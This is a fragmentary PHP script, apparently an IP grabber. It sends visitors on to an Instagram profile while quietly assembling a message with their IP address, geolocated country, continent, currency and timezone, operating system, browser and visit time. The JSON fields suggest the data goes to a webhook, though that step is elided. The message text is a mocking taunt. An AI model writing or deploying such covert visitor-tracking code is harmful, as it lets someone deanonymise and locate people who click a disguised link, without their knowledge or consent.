<?php
header( 'Location: https://www.instagram.com/necis_orcus/?hl=en' ) ;
...
$make_json = json_encode(array('content'=>"Best Instagram bich tank u very much  | $ipdat->geoplugin_countryName | $ipdat->geoplugin_continentName | $ipdat->geoplugin_currencyCode | $ipdat->geoplugin_timezone | $ip | $user_os | $user_browser | $time \n", "username" => "$ip"));
